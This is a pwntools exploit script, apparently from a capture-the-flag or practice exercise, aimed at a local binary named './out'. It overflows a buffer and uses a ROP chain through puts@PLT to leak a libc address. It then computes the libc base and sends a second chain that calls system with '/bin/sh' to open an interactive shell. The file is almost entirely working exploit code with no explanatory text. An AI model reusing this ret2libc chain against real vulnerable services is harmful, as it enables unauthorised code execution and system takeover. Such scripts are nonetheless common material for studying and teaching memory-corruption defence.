from pwn import *

p = process("./out")
context.binary = "./out"
binary = ELF('./out')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gdb.attach(p)
JUNK = b"A" * 40
main = p64(0x401156)
got_puts = p64(0x404018)
plt_puts = p64(0x401050)
pop_rdi  = p64(0x4011f3)

payload = JUNK
payload += pop_rdi
payload += got_puts
payload += plt_puts
payload += main

p.sendline(payload)
p.recvline()

leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
log.success("Leaked puts :  {}".format(hex(leaked_puts)))

offset = leaked_puts - libc.symbols['puts']
log.success("Libc base address :  {}".format(hex(offset)))

#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
binsh = p64(offset + 0x1b75aa)
system = p64(offset + libc.symbols['system'])
exit = p64(offset + libc.symbols['exit'])
ret = p64(0x40101a)

payload = JUNK
payload += pop_rdi
payload += binsh
payload += ret
payload += system
payload += exit

p.sendline(payload)
p.interactive()
